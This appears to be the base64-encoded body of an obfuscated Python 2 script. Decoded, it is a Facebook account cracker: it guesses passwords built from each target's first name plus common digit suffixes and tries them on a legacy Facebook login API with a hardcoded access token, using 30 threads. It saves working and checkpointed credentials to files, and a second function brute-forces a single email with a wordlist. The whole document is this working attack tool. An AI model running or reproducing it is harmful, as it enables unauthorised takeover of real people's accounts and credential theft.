gKyB1c2VyICsgJ1xuXHhlMlx4OTVceDkxUEFTUzogJyArIHBhc3MzICsgJ1xuXHhlMlx4OTVceDlhTkFXOiAnICsgYlsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgICAgIGNlayA9IG9wZW4oJ291dC9DUC50eHQnLCAnYScpCiAgICAgICAgICAgICAgICAgICAgICAgIGNlay53cml0ZSh1c2VyICsgJ3wnICsgcGFzczMgKyAnXG4nKQogICAgICAgICAgICAgICAgICAgICAgICBjZWsuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICBjZWtwb2ludC5hcHBlbmQodXNlciArIHBhc3M0KQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3M0ID0gYlsnZmlyc3RfbmFtZSddICsgJzEyMzQ1NicKICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHVybGxpYi51cmxvcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9JyArIHVzZXIgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzczQgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JykKICAgICAgICAgICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1xuXHgxYlsxOzkybVx4ZTJceDk1XHg5NFtWZXJ5IEdPT0RdIFx4MWJbMTs5Mm0gJyArICdcblx4ZTJceDk1XHg5MUlEOiAnICsgdXNlciArICdcblx4ZTJceDk1XHg5MVBBU1M6ICcgKyBwYXNzNCArICdcblx4ZTJceDk1XHg5YU5BVzogJyArIGJbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb2tzLmFwcGVuZCh1c2VyICsgcGFzczQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1xuXHgxYlsxOzM2OzQwbVx4ZTJceDk1XHg5NFtTb3JyeSBDSEVDS1BPSU5UXSBceDFiWzE7OTdtICcgKyAnXG5ceGUyXHg5NVx4OTFJRDogJyArIHVzZXIgKyAnXG5ceGUyXHg5NVx4OTFQQVNTOiAnICsgcGFzczQgKyAnXG5ceGUyXHg5NVx4OWFOQVc6ICcgKyBiWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlayA9IG9wZW4oJ291dC9DUC50eHQnLCAnYScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZWsud3JpdGUodXNlciArICd8JyArIHBhc3M0ICsgJ1xuJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlay5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZWtwb2ludC5hcHBlbmQodXNlciArIHBhc3M0KQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzczUgPSBiWydmaXJzdF9uYW1lJ10gKyAnMTEyMicKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSB1cmxsaWIudXJsb3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPScgKyB1c2VyICsgJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JyArIHBhc3M1ICsgJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBxID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdcblx4MWJbMTs5Mm1ceGUyXHg5NVx4OTRbVmVyeSBHT09EXSBceDFiWzE7OTJtICcgKyAnXG5ceGUyXHg5NVx4OTFJRDogJyArIHVzZXIgKyAnXG5ceGUyXHg5NVx4OTFQQVNTOiAnICsgcGFzczUgKyAnXG5ceGUyXHg5NVx4OWFOQVc6ICcgKyBiWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHVzZXIgKyBwYXNzNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdcblx4MWJbMTszNjs0MG1ceGUyXHg5NVx4OTRbU29ycnkgQ0hFQ0tQT0lOVF0gXHgxYlsxOzk3bScgKyAnXG5ceGUyXHg5NVx4OTFJRDogJyArIHVzZXIgKyAnXG5ceGUyXHg5NVx4OTFQQVNTOiAnICsgcGFzczUgKyAnXG5ceGUyXHg5NVx4OWFOQVc6ICcgKyBiWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZWsgPSBvcGVuKCdvdXQvQ1AudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlay53cml0ZSh1c2VyICsgJ3wnICsgcGFzczUgKyAnXG4nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlay5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrcG9pbnQuYXBwZW5kKHVzZXIgKyBwYXNzNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzczYgPSBiWydmaXJzdF9uYW1lJ10gKyAnMTIzNDU2NycKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0nICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzNiArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXG5ceDFiWzE7OTJtXHhlMlx4OTVceDk0W1ZlcnkgR09PRF0gXHgxYlsxOzkybSAnICsgJ1xuXHhlMlx4OTVceDkxSUQ6ICcgKyB1c2VyICsgJ1xuXHhlMlx4OTVceDkxUEFTUzogJyArIHBhc3M2ICsgJ1xuXHhlMlx4OTVceDlhTkFXOiAnICsgYlsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodXNlciArIHBhc3M2KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXG5ceDFiWzE7MzY7NDBtXHhlMlx4OTVceDk0W1NvcnJ5IENIRUNLUE9JTlRdIFx4MWJbMTs5N20gJyArICdcblx4ZTJceDk1XHg5MUlEOiAnICsgdXNlciArICdcblx4ZTJceDk1XHg5MVBBU1M6ICcgKyBwYXNzNiArICdcblx4ZTJceDk1XHg5YU5BVzogJyArIGJbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZWsgPSBvcGVuKCdvdXQvQ1AudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZWsud3JpdGUodXNlciArICd8JyArIHBhc3M2ICsgJ1xuJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrcG9pbnQuYXBwZW5kKHVzZXIgKyBwYXNzNikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzNyA9IGJbJ2ZpcnN0X25hbWUnXSArICcxMjMxMjMnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSB1cmxsaWIudXJsb3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPScgKyB1c2VyICsgJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JyArIHBhc3M3ICsgJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdcblx4MWJbMTs5Mm1ceGUyXHg5NVx4OTRbVmVyeSBHT09EXSBceDFiWzE7OTJtICcgKyAnXG5ceGUyXHg5NVx4OTFJRDogJyArIHVzZXIgKyAnXG5ceGUyXHg5NVx4OTFQQVNTOiAnICsgcGFzczcgKyAnXG5ceGUyXHg5NVx4OWFOQVc6ICcgKyBiWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodXNlciArIHBhc3M3KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvcl9tc2cnXToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdcblx4MWJbMTszNjs0MG1ceGUyXHg5NVx4OTRbU29ycnkgQ0hFQ0tQT0lOVF0gXHgxYlsxOzk3bSAnICsgJ1xuXHhlMlx4OTVceDkxSUQ6ICcgKyB1c2VyICsgJ1xuXHhlMlx4OTVceDkxUEFTUzogJyArIHBhc3M3ICsgJ1xuXHhlMlx4OTVceDlhTkFXOiAnICsgYlsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZWsgPSBvcGVuKCdvdXQvQ1AudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrLndyaXRlKHVzZXIgKyAnfCcgKyBwYXNzNyArICdcbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZWsuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrcG9pbnQuYXBwZW5kKHVzZXIgKyBwYXNzNykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3M4ID0gYlsnZmlyc3RfbmFtZSddICsgJyAxMjM0NTY3OCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSB1cmxsaWIudXJsb3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPScgKyB1c2VyICsgJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JyArIHBhc3M4ICsgJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBxID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1xuXHgxYlsxOzkybVx4ZTJceDk1XHg5NFtWZXJ5IEdPT0RdIFx4MWJbMTs5Mm0gJyArICdcblx4ZTJceDk1XHg5MUlEOiAnICsgdXNlciArICdcblx4ZTJceDk1XHg5MVBBU1M6ICcgKyBwYXNzOCArICdcblx4ZTJceDk1XHg5YU5BVzogJyArIGJbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodXNlciArIHBhc3M4KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnXG5ceDFiWzE7MzY7NDBtXHhlMlx4OTVceDk0W1NvcnJ5IENIRUNLUE9JTlRdIFx4MWJbMTs5N20gJyArICdcblx4ZTJceDk1XHg5MUlEOiAnICsgdXNlciArICdcblx4ZTJceDk1XHg5MVBBU1M6ICcgKyBwYXNzOCArICdcblx4ZTJceDk1XHg5YU5BVzogJyArIGJbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlayA9IG9wZW4oJ291dC9DUC50eHQnLCAnYScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrLndyaXRlKHVzZXIgKyAnfCcgKyBwYXNzOCArICdcbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZWtwb2ludC5hcHBlbmQodXNlciArIHBhc3M4KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzOSA9IGJbJ2ZpcnN0X25hbWUnXSArICcxMTIyMzMnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHVybGxpYi51cmxvcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9JyArIHVzZXIgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzczkgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBxID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1xuXHgxYlsxOzkybVx4ZTJceDk1XHg5NFtWZXJ5IEdPT0RdIFx4MWJbMTs5Mm0gJyArICdcblx4ZTJceDk1XHg5MUlEOiAnICsgdXNlciArICdcblx4ZTJceDk1XHg5MVBBU1M6ICcgKyBwYXNzOSArICdcblx4ZTJceDk1XHg5YU5BVzogJyArIGJbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHVzZXIgKyBwYXNzOSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvcl9tc2cnXToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1xuXHgxYlsxOzM2OzQwbVx4ZTJceDk1XHg5NFtTb3JyeSBDSEVDS1BPSU5UXSBceDFiWzE7OTdtICcgKyAnXG5ceGUyXHg5NVx4OTFJRDogJyArIHVzZXIgKyAnXG5ceGUyXHg5NVx4OTFQQVNTOiAnICsgcGFzczkgKyAnXG5ceGUyXHg5NVx4OWFOQVc6ICcgKyBiWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrID0gb3Blbignb3V0L0NQLnR4dCcsICdhJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrLndyaXRlKHVzZXIgKyAnfCcgKyBwYXNzOSArICdcbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlay5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNla3BvaW50LmFwcGVuZCh1c2VyICsgcGFzczkpCgkJZXhjZXB0OgkJCQkJCQkJCQkJCQkJCQkJCQoJCQlwYXNzCgkJCglwID0gVGhyZWFkUG9vbCgzMCkKCXAubWFwKG1haW4sIGlkKSAKCQoJcHJpbnQgJ1vinJNdLi4uLicKCXByaW50ICJbKykoK10gXDAzM1sxOzMyOzQwbVZlcnkuR09PRFwwMzNbMTszNjs0MG0vXDAzM1sxOzMxOzQwbXNvcnJ5LkNIRUNLUE9JTlQgXDAzM1sxOzM2OzQwbTogXDAzM1sxOzMyOzQwbSIrc3RyKGxlbihva3MpKSsiXDAzM1sxOzM2OzQwbS9cMDMzWzE7MzE7NDBtIitzdHIobGVuKGNla3BvaW50KSkKCXByaW50ICdcMDMzWzE7MzQ7NDBtWytdIOKInuKck+KIheKck+Kck+Kck+Kck+KckyA6IHNhdmUvY3AudHh0JwoJcHJpbnQgIiIiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIiIgoJcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzk3bUJhY2tcMDMzWzE7OTZtXSIpCglzdXBlcigpCgpkZWYgYnJ1dGUoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIEVlcm9yJwogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICAgICAgdGltZS5zbGVlcCgwLjUpCiAgICAgICAgbG9naW4oKQogICAgZWxzZToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJwogICAgICAgIHRyeToKICAgICAgICAgICAgZW1haWwgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUlEXHgxYlsxOzk3bS9ceDFiWzE7OTJtRW1haWwgXHgxYlsxOzk3beKck+Kck+Kcky0tPiBceDFiWzE7OTFtOlx4MWJbMTs5N20gJykKICAgICAgICAgICAgcGFzc3cgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybVdvcmRsaXN04pyTPD8+IFx4MWJbMTs5N21leHQobGlzdC50eHQpIFx4MWJbMTs5MW06IFx4MWJbMTs5N20nKQogICAgICAgICAgICB0b3RhbCA9IG9wZW4ocGFzc3csICdyJykKICAgICAgICAgICAgdG90YWwgPSB0b3RhbC5yZWFkbGluZXMoKQogICAgICAgICAgICBwcmludCAnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJwogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceDFiWzE7OTZtXHhlMlx4OWNceDkzXHgxYlsxOzkxbV0gXHgxYlsxOzkybeKck+Kck+Kckzw/PiBceDFiWzE7OTFtOlx4MWJbMTs5N20gJyArIGVtYWlsCiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1BbGxceDFiWzE7OTZtICcgKyBzdHIobGVuKHRvdGFsKSkgKyAnIFx4MWJbMTs5Mm1QYXNzd29yZCE/JwogICAgICAgICAgICBqYWxhbignXHgxYlsxOzkxbVtceGUyXHg5Y1x4YmFdIFx4MWJbMTs5Mm1wbHogd2FpdCBceDFiWzE7OTdtLi4uJykKICAgICAgICAgICAgc2FuZGkgPSBvcGVuKHBhc3N3LCAncicpCiAgICAgICAgICAgIGZvciBwdyBpbiBzYW5kaToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBwdyA9IHB3LnJlcGxhY2UoJ1xuJywgJycpCiAgICAgICAgICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZSgnXHJceDFiWzE7OTFtW1x4MWJbMTs5Nm1ceGUyXHg5Y1x4YjhceDFiWzE7OTFtXSBceDFiWzE7OTJtVHJ5IFx4MWJbMTs5N20nICsgcHcpCiAgICAgICAgICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPScgKyBlbWFpbCArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwdyArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnKQogICAgICAgICAgICAgICAgICAgIG1wc2ggPSBqc29uLmxvYWRzKGRhdGEudGV4dCkKICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBtcHNoOgogICAgICAgICAgICAgICAgICAgICAgICBkYXBhdCA9IG9wZW4oJ0JydXRlLnR4dCcsICd3JykKICAgICAgICAgICAgICAgICAgICAgICAgZGFwYXQud3JpdGUoZW1haWwgKyAnIHwgJyArIHB3ICsgJ1xuJykKICAgICAgICAgICAgICAgICAgICAgICAgZGFwYXQuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXG5ceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1lZXJvcicKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtVXNlcm5hbWUgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBlbWFpbAogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5ZVx4YjldIFx4MWJbMTs5Mm1QYXNzd29yZCBceDFiWzE7OTFtOlx4MWJbMTs5N20gJyArIHB3CiAgICAgICAgICAgICAgICAgICAgICAgIGtlbHVhcigpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIG1wc2hbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrcyA9IG9wZW4oJ0JydXRlY2VrcG9pbnQudHh0JywgJ3cnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2Vrcy53cml0ZShlbWFpbCArICcgfCAnICsgcHcgKyAnXG4nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2Vrcy5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXG5ceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1FZXJvcicKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFx4MWJbMTs5M21zb3JyeSBDaGVja3BvaW50JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtVXNlcm5hbWUgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBlbWFpbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtUGFzc3dvcmQgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBwdwogICAgICAgICAgICAgICAgICAgICAgICAgICAga2VsdWFyKCkKICAgICAgICAgICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXUludGVybmV0JwogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKCiAgICAgICAgZXhjZXB0IElPRXJyb3I6CiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdRmlsZS4/ISEnCiAgICAgICAgICAgIHByaW50ICIiIlxuXHgxYlsxOzkxbVshXSBceDFiWzE7OTJtRWVyb3IiIiIKICAgICAgICAgICAgc3VwZXIoKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKCWxvZ2luKCk="))
